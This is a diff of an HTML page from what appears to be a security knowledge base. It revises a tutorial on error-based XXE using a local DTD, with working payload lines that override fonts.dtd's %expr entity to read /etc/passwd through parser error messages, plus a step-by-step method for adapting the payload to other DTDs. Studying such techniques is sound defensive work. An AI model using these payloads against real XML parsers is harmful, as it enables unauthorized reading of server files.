@@ -9,7 +9,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&family=Inter:wght@400;500&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
-  <link rel="stylesheet" href="/assets/style.css?v=c90acc1">
+  <link rel="stylesheet" href="/assets/style.css?v=1fa0bdb">
 </head>
 <body class="page-kb-sheet">
   <nav class="topnav">
@@ -1444,7 +1444,7 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <li><code>%file</code> loads the contents of <code>/etc/passwd</code> from the local filesystem.</li>
 <li><code>%eval</code> creates a new parameter entity <code>%error</code> that references a non-existent file path concatenated with <code>%file</code> content.</li>
 <li>When the parser expands <code>%error</code>, it attempts to resolve the invalid path, triggering an error message that includes the contents of <code>/etc/passwd</code>.</li>
-<li>Note the <code>&lt;!ELEMENT aa (bb'&gt;</code> declaration at the end of the override — <strong>this is the structural padding</strong> that makes the payload syntactically valid when assembled with fonts.dtd. The mechanics behind it and how to derive equivalent padding for other DTDs are covered in 4th point of <a href="### Dissecting the Structural Padding">Dissecting the Structural Padding</a>.</li>
+<li>Note the <code>&lt;!ELEMENT aa (bb'&gt;</code> declaration at the end of the override — <strong>this is the structural padding</strong> that makes the payload syntactically valid when assembled with fonts.dtd. The mechanics behind it and how to derive equivalent padding for other DTDs are covered in section <a href="### Dissecting the Structural Padding">Dissecting the Structural Padding</a>.</li>
 </ol>
 <ul>
 <li><strong>Step 3:</strong> Trigger Error-Based Exfiltration:
@@ -1453,57 +1453,96 @@ C:\Program Files\IBM\SQLLIB\bin\dtds\*.dtd</code></pre>
 <pre class="highlight"><code>errorMessage: "/nonexistent/root:x:0:0:root:/root:/bin/bash"</code></pre>
 <h3 id="dissecting-the-structural-padding">Dissecting the Structural Padding</h3>
 <p>The structural padding — <code>&lt;!ELEMENT aa (bb'&gt;</code> — is not an arbitrary placeholder. Its exact form is derived from the DTD being exploited, and understanding why it looks the way it does is essential for adapting this technique to other DTDs.</p>
+<h4 id="the-entity-value-and-the-role-of-the-single-quote">The Entity Value and the Role of the Single Quote</h4>
+<p>Before dissecting the assembly, one detail must be clear: the single quote in <code>&lt;!ELEMENT aa (bb'&gt;</code> is <strong>not</strong> part of the injected content. It is the closing delimiter of the entity value in the override declaration:</p>
+<pre class="highlight"><code class="language-xml">&lt;!ENTITY % expr '...&lt;!ELEMENT aa (bb'&gt;</code></pre>
+<p>What the parser expands when it encounters <code>%expr;</code> is everything between the two <code>'</code> delimiters, without them. The actual value injected into the DTD ends with <code>(bb</code>, not <code>(bb'</code>. This distinction is critical for understanding why the assembled declarations are syntactically valid.</p>
 <h4 id="the-injection-point-in-fontsdtd">The Injection Point in fonts.dtd</h4>
-<p>When analysing <code>fonts.dtd</code>, the relevant declaration is:</p>
-<pre class="highlight"><code>&lt;!ELEMENT matrix ((%expr;), (%expr;), (%expr;), (%expr;))&gt;</code></pre>
-<p>This is the declaration that <code>%expr;</code> appears inside of, making it the injection point. When we override <code>%expr;</code>, the parser substitutes our value in place of every <code>%expr;</code> reference — including the first one in this declaration.</p>
+<p>When analysing <code>fonts.dtd</code>, we are looking for the <strong>first relevant use site</strong> of <code>%expr;</code> after its declaration — the first <code>&lt;!ELEMENT&gt;</code> or <code>&lt;!ATTLIST&gt;</code> body where <code>%expr;</code> is referenced, because that is where the parser will expand our override. Scanning the DTD in order, the first relevant use site is:</p>
+<pre class="highlight"><code>&lt;!ELEMENT test (%expr;)*&gt;</code></pre>
+<p>This is the declaration our override breaks open. <code>matrix</code> also references <code>%expr;</code> but appears later in the file — by the time the parser reaches it, the exfiltration logic has already executed.</p>
 <h4 id="how-the-parser-assembles-the-payload">How the Parser Assembles the Payload</h4>
-<p>Stripping out the exfiltration logic and focusing purely on structure, our override of <code>%expr;</code> looks like this:</p>
+<p>The literal value of <code>%expr;</code> — exactly as it appears between the entity delimiters — is:</p>
 <pre class="highlight"><code>aaa)&gt;
-    [exfiltration logic]
-    &lt;!ELEMENT aa (bb'</code></pre>
-<p>When the parser expands the first <code>%expr;</code> inside the <code>matrix</code> declaration, the assembled result is:</p>
-<pre class="highlight"><code class="language-xml">&lt;!ELEMENT matrix ((aaa)&gt;
-[exfiltration logic]
-&lt;!ELEMENT aa (bb', (%expr;), (%expr;), (%expr;))&gt;</code></pre>
+    &lt;!ENTITY &amp;#x25; file SYSTEM "file:///etc/passwd"&gt;
+    &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;"&gt;
+    &amp;#x25;eval;
+    &amp;#x25;error;
+    &lt;!ELEMENT aa (bb</code></pre>
+<p>The following is a conceptual normalisation of this literal after character-reference decoding (<code>&amp;#x25;</code> → <code>%</code>, <code>&amp;#x26;</code> → <code>&amp;</code>, <code>&amp;#x27;</code> → <code>'</code>). It is not the final post-expansion state — <code>%eval;</code> and <code>%error;</code> are still unresolved references at this stage, declared but not yet expanded:</p>
+<pre class="highlight"><code>aaa)&gt;
+    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+    &lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+    %eval;
+    %error;
+    &lt;!ELEMENT aa (bb</code></pre>
+<p>The expansion of <code>%expr;</code> initiates a three-phase chain:</p>
+<ul>
+<li><strong>Phase 1 — <code>%expr;</code></strong> injects the above text into the DTD, including the declarations of <code>%file</code> and <code>%eval</code>.</li>
+<li><strong>Phase 2 — <code>%eval;</code></strong>, when expanded, produces the declaration of <code>%error</code>.</li>
+<li><strong>Phase 3 — <code>%error;</code></strong>, when expanded, attempts to resolve a URI that concatenates a non-existent path with the contents of <code>%file;</code>, triggering an error message that leaks the file contents.</li>
+</ul>
+<p>When the parser expands <code>%expr;</code> inside the <code>test</code> declaration, the assembled DTD becomes:</p>
+<pre class="highlight"><code class="language-xml">&lt;!ELEMENT test (aaa)&gt;
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+%eval;
+%error;
+&lt;!ELEMENT aa (bb)*&gt;</code></pre>
 <p>Three things happen here:</p>
 <ol>
 <li>
-<p><strong><code>&lt;!ELEMENT matrix ((aaa)&gt;</code></strong> — the <code>aaa)&gt;</code> from our override closes the <code>matrix</code> declaration prematurely. The parser sees a valid (if meaningless) element declaration and moves on.</p>
+<p><strong><code>&lt;!ELEMENT test (aaa)&gt;</code></strong> — the <code>(</code> that precedes <code>%expr;</code> in the original declaration plus the <code>aaa)&gt;</code> from our override produce <code>(aaa)</code> — a perfectly balanced, syntactically valid content model. The parser closes the <code>test</code> declaration and moves on.</p>
 </li>
 <li>
-<p><strong>Exfiltration logic</strong> — now sitting outside any enclosing declaration, the parser processes our injected <code>%file</code>, <code>%eval</code>, and <code>%error</code> entities as independent DTD declarations. This is exactly where we need them.</p>
+<p><strong>Exfiltration logic</strong> — now sitting outside any enclosing declaration, the parser processes <code>%file</code> and <code>%eval</code> as independent DTD declarations, then drives the three-phase expansion chain that triggers the error-based exfiltration.</p>
 </li>
 <li>
-<p><strong><code>&lt;!ELEMENT aa (bb', (%expr;), (%expr;), (%expr;))&gt;</code></strong> — the <code>&lt;!ELEMENT aa (bb'</code> from our padding combines with the <em>remainder</em> of the original <code>matrix</code> declaration (<code>, (%expr;), (%expr;), (%expr;))&gt;</code>) to form a new, syntactically valid element declaration. Without the padding, the parser would encounter <code>, (%expr;)...</code> with no opening context and reject it as malformed.</p>
+<p><strong><code>&lt;!ELEMENT aa (bb)*&gt;</code></strong> — the <code>&lt;!ELEMENT aa (bb</code> from our padding combines with the remainder of the original <code>test</code> declaration (<code>)*&gt;</code>) to form a new, syntactically valid element declaration. The <code>(</code> opened by the padding is closed by <code>)</code>, and <code>*</code> is applied as the quantifier. The parentheses are perfectly balanced. Without the padding, the parser would encounter <code>)*&gt;</code> with no opening context and reject it as malformed.</p>
 </li>
 </ol>
-<p>The padding's job is therefore twofold: introduce a new element name (<code>aa</code>) to give the leftover tokens a valid home, and open a content model parenthesis <code>(</code> that the remainder of the original declaration closes.</p>
-<p>The <code>bb'</code> is simply a placeholder element name that precedes the <code>, (%expr;)</code> tokens from the original declaration. The single quote has no special meaning inside a DTD content model and is tolerated by the parser.</p>
+<h4 id="the-matrix-case">The matrix Case</h4>
+<p><code>matrix</code> is worth examining separately because its declaration structure produces a different and more complex assembly. Its declaration is:</p>
+<pre class="highlight"><code>&lt;!ELEMENT matrix ((%expr;), (%expr;), (%expr;), (%expr;))&gt;</code></pre>
+<p>Here <code>%expr;</code> is preceded by a double open parenthesis <code>((</code>. When our override is expanded, the assembly becomes:</p>
+<pre class="highlight"><code class="language-xml">&lt;!ELEMENT matrix ((aaa)&gt;
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % eval "&lt;!ENTITY % error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;
+%eval;
+%error;
+&lt;!ELEMENT aa (bb, (%expr;), (%expr;), (%expr;))&gt;</code></pre>
+<p>Two differences stand out compared to the <code>test</code> case:</p>
+<ul>
+<li>
+<p><strong><code>&lt;!ELEMENT matrix ((aaa)&gt;</code></strong> has unbalanced parentheses — the outer <code>(</code> is never closed. Whether this is tolerated depends entirely on the parser. The <code>matrix</code> case is parser-dependent and should not be treated as a clean or portable assembly path.</p>
+</li>
+<li>
+<p><strong><code>&lt;!ELEMENT aa (bb, (%expr;), (%expr;), (%expr;))&gt;</code></strong> — the padding absorbs a richer remainder. The <code>, (%expr;), (%expr;), (%expr;))&gt;</code> tokens from the original declaration attach to <code>&lt;!ELEMENT aa (bb</code>, forming a valid content model. The outer <code>)</code> of the original declaration closes the <code>(</code> opened by the padding, and the parentheses balance correctly.</p>
+</li>
+</ul>
+<p>Prefer <code>test</code>-style injection points over <code>matrix</code>-style ones when building payloads for unknown or strict parser environments.</p>
 <h4 id="deriving-the-padding-for-other-dtds">Deriving the Padding for Other DTDs</h4>
-<p>The shape of the padding depends entirely on what the remainder of the original declaration looks like after the first <code>%name;</code> reference. The two most common cases are:</p>
-<p><strong>Case 1: Rich remainder</strong> — the declaration contains additional tokens after <code>%name;</code>, such as further <code>(%expr;)</code> references, commas, or nested parentheses. This is the <code>matrix</code> case. The remainder <code>, (%expr;), (%expr;), (%expr;))&gt;</code> is rich enough that the padding needs to open a content model with a placeholder element to give those tokens a valid home:</p>
-<pre class="highlight"><code>&lt;!ELEMENT aa (bb'</code></pre>
-<p>The single quote is tolerated by the parser and the remainder closes the parenthesis correctly.</p>
-<p><strong>Case 2: Minimal remainder</strong> — the declaration uses a quantifier like <code>*</code>, <code>+</code>, or <code>?</code> directly after <code>%name;</code>, leaving only <code>)*&gt;</code>, <code>)+&gt;</code>, or <code>)?&gt;</code>  as the remainder. This is the case for <code>test</code> and <code>edit</code> in <code>fonts.dtd</code>, both declared as <code>(%expr;)*</code>. Here the remainder is simply <code>)*&gt;</code>, which closes a single open parenthesis and applies the quantifier. The padding only needs to open a content model with a placeholder:</p>
+<p>The shape of the padding depends entirely on what follows the first <code>%name;</code> use site in the target declaration — the remainder that the padding must absorb. The two cases are:</p>
+<p><strong>Case 1: Minimal remainder</strong> — the declaration uses a quantifier (<code>*</code>, <code>+</code>, or <code>?</code>) directly after <code>%name;</code>, leaving only <code>)*&gt;</code>, <code>)+&gt;</code>, or <code>)?&gt;</code>  as the remainder. This is the <code>test</code> and <code>edit</code> case in <code>fonts.dtd</code>. The padding opens a content model with a placeholder:</p>
 <pre class="highlight"><code>&lt;!ELEMENT aa (bb</code></pre>
-<p>The assembled result is <code>&lt;!ELEMENT aa (bb)*&gt;</code> — a valid element declaration with a <code>*</code> quantifier. The remainder in this case is minimal enough that no single quote or additional tokens are needed — the padding is simpler than in Case 1.</p>
+<p>The assembled result is <code>&lt;!ELEMENT aa (bb)*&gt;</code> — a valid declaration with perfectly balanced parentheses. Prefer these injection points where possible.</p>
+<p><strong>Case 2: Rich remainder</strong> — the declaration contains additional tokens after <code>%name;</code>, such as further <code>(%expr;)</code> references, commas, or nested parentheses. This is the <code>matrix</code> case. The same padding form applies, but the broken declaration will have unbalanced parentheses. Whether this is accepted depends on the target parser. Test explicitly before relying on this path.</p>
 <p><strong>The general process</strong> for any DTD is:</p>
 <ol>
 <li>
-<p><strong>Find the injection point.</strong> Locate the declaration where <code>%name;</code> appears inside a <code>&lt;!ELEMENT&gt;</code> or <code>&lt;!ATTLIST&gt;</code> body. This is the declaration your override will break open.</p>
+<p><strong>Find the injection point.</strong> Scan the DTD in order and locate the <strong>first relevant use site</strong> of <code>%name;</code> — the first <code>&lt;!ELEMENT&gt;</code> or <code>&lt;!ATTLIST&gt;</code> body where it is referenced after its declaration. This is where the parser will expand your override and where the exfiltration logic will execute.</p>
 </li>
 <li>
-<p><strong>Identify what precedes <code>%name;</code> in that declaration.</strong> This tells you what your override needs to close. Count open parentheses and determine the minimum tokens needed to terminate the declaration with <code>&gt;</code>.</p>
+<p><strong>Identify what precedes <code>%name;</code> in that declaration.</strong> Count open parentheses and determine the minimum tokens needed to close them and terminate the declaration with <code>&gt;</code>. This is the opening of your override value.</p>
 </li>
 <li>
-<p><strong>Identify what follows <code>%name;</code> in that declaration.</strong> This is the leftover content your padding needs to absorb. Note whether the remainder is rich (multiple tokens) or minimal (just a quantifier and <code>&gt;</code>).</p>
+<p><strong>Identify what follows <code>%name;</code> in that declaration.</strong> This is the leftover content your padding must absorb. Determine whether the remainder is minimal (Case 1) or rich (Case 2).</p>
 </li>
 <li>
-<p><strong>Construct the padding.</strong> Open a new <code>&lt;!ELEMENT name (placeholder</code> where <code>placeholder</code> is any valid XML name. If the remainder is minimal (Case 2), a bare placeholder is sufficient. If the remainder is rich (Case 1), you may need an additional character such as a single quote to separate your placeholder from the incoming tokens.</p>
+<p><strong>Construct the padding.</strong> Open a new <code>&lt;!ELEMENT name (placeholder</code> where <code>placeholder</code> is any valid XML name. Remember that the closing delimiter <code>'</code> of the entity value is not part of the injected content — the padding ends with <code>(placeholder</code>, and the remainder of the original declaration provides the closing <code>)</code>.</p>
 </li>
 <li>
-<p><strong>Verify the assembled output is valid DTD.</strong> Mentally substitute your override into the original declaration and check that every <code>&lt;!ELEMENT&gt;</code> and <code>&lt;!ENTITY&gt;</code> that results is syntactically complete.</p>
+<p><strong>Verify the assembled output is valid DTD.</strong> Mentally substitute your override into the original declaration and check that every resulting <code>&lt;!ELEMENT&gt;</code> and <code>&lt;!ENTITY&gt;</code> is syntactically complete. For Case 1 injection points, parentheses should balance cleanly. For Case 2, test against the target parser explicitly.</p>
 </li>
 </ol>
 <h3 id="requirements-for-robust-payloads">Requirements for Robust Payloads</h3>
@@ -1905,6 +1944,6 @@ unzip interactsh-client_1.0.0_linux_amd64.zip
       });
     });
   </script>
-  <script src="/assets/main.js?v=c90acc1" defer></script>
+  <script src="/assets/main.js?v=1fa0bdb" defer></script>
 </body>
 </html>
